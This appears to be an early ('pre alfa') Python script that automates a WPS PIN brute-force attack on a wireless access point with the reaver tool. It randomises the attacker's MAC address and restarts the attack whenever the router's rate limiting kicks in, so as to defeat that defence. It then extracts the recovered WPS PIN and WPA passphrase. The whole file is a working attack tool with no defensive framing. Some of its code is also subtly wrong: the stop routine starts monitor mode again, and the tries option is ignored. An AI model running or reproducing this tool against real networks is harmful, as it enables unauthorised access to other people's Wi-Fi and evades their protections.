#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# WPS bruteforce + MAC address spoof
# pre alfa version

__author__ = '090h'
__license__ = 'GPL'

# import logging
# logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Shut up Scapy
# from scapy.all import *
# conf.verb = 0 # Scapy I thought I told you to shut up
# from signal import SIGINT, signal
# import socket
# import struct
# import fcntl
from argparse import ArgumentDefaultsHelpFormatter, ArgumentParser
from os import path, devnull
from sys import argv, exit
from subprocess import Popen, PIPE, STDOUT
from random import randint
from re import search
from pprint import pprint


def myrun(cmd):
    """from http://blog.kagesenshi.org/2008/02/teeing-python-subprocesspopen-output.html
    """
    p = Popen(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
    stdout = []
    while True:
        line = p.stdout.readline()
        stdout.append(line)
        print line,
        if line == '' and p.poll() is not None:
            break
    return ''.join(stdout)


def exec_cmd(cmd):
    return Popen(cmd, shell=True, stdout=PIPE).communicate()[0]


def which(cmd):
    return exec_cmd('which %s' % cmd)


def reaver_exists():
    return which('reaver') != ''


def airmon_exists():
    return which('airmon-ng') != ''


def iwconfig():
    monitors = []
    interfaces = {}
    proc = Popen(['iwconfig'], stdout=PIPE, stderr=open(devnull, 'w'))
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0:
            continue  # Isn't an empty string

        if line[0] != ' ':  # Doesn't start with space
            wired_search = search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search:  # Isn't wired
                iface = line[:line.find(' ')]  # is the interface
                if 'Mode:Monitor' in line:
                    monitors.append(iface)
                elif 'IEEE 802.11' in line:
                    if "ESSID:\"" in line:
                        interfaces[iface] = 1
                    else:
                        interfaces[iface] = 0
    return monitors, interfaces


def start_monitor(iface):
    print('Starting mon on %s' % iface)
    exec_cmd('airmon-ng start %s' % iface)


def stop_monitor(iface):
    print('Stoping mon on %s' % iface)
    exec_cmd('airmon-ng start %s' % iface)


def random_mac():
    mac = [0x00, 0x16, 0x3e,
           randint(0x00, 0x7f),
           randint(0x00, 0xff),
           randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))


def change_mac(iface, mac=None):
    exec_cmd('ifconfig %s down' % iface)
    if mac is None:
        mac = random_mac()
    exec_cmd('ifconfig %s hw ether %s' % (iface, mac))
    exec_cmd('ifconfig %s up' % iface)
    return mac


def reaver(iface, bssid, mac, channel=None):
    res = {'pin': None, 'key': None, 'rate_limit': False, 'stdout': None}

    cmd = 'reaver -i %s -b %s -vv --mac=%s' % (iface, bssid, mac)
    if channel is not None:
        cmd += ' -c %s' % channel

    p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
    stdout = []
    while True:
        line = p.stdout.readline()
        stdout.append(line)
        print(line.strip())

        if line.find('Failed to initialize interface ') != -1:
            # print(line)
            exit(-1)

        # Automatic resume
        if line.find('[+] Restored previous session') != -1:
            p.stdin.write('Y\n')

        # [!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
        if line.find("Detected AP rate limiting") != -1:
            res['rate_limit'] = True
            print('AP rate limit detected. Killing reaver...')
            p.kill()
            break
        # Check for PIN/PSK
        elif line.find("WPS PIN: '") != -1:
            res['pin'] = line[line.find("WPS PIN: '") + 10:-1]
        elif line.find("WPA PSK: '") != -1:
            res['key'] = line[line.find("WPA PSK: '") + 10:-1]

        if line == '' and p.poll() is not None:
            break

    res['stdout'] = ''.join(stdout)
    return res


def prepare_mon(iface):
    mac = change_mac(iface)
    print('Changed MAC on %s to %s' % (iface, mac))
    mon1, ifaces1 = iwconfig()
    # print('Mointors found:', mon1)
    start_monitor(iface)
    mon2, ifaces2 = iwconfig()
    # print('Mointors found:', mon2)
    mon = list(set(mon2) - set(mon1))
    mon = mon[0]
    # print('Delta mon', mon)
    return mon, mac


def reset_mon(iface, mon):
    stop_monitor(mon)
    return prepare_mon(iface)


def crack_wps(iface, bssid, channel=None, tries=3):
    mon, mac = prepare_mon(iface)

    while True:
        res = reaver(mon, bssid, mac, channel)
        pprint(res)
        if res['key'] is not None or res['pin'] is not None:
            print('Valid found!')
            break
        elif res['rate_limit']:
            if tries == 0:
                print('Tries exceeded.')
                break
            mon, mac = reset_mon(iface, mon)
            tries -= 1
        else:
            print('Unknown error')
            break


if __name__ == '__main__':
    parser = ArgumentParser('reaver-spoof', description='reaver-wps + mac spoof')
    parser.add_argument('-i', '--interface', required=True, help='interface to use')
    parser.add_argument('-b', '--bssid', required=True, help='AP bssid')
    parser.add_argument('-c', '--channel', help='channel')
    parser.add_argument('-t', '--tries', type=int, default=3, help='tries')
    args = parser.parse_args()

    if 'channel' in args:
        crack_wps(args.interface, args.bssid, args.channel)
    else:
        crack_wps(args.interface, args.bssid)
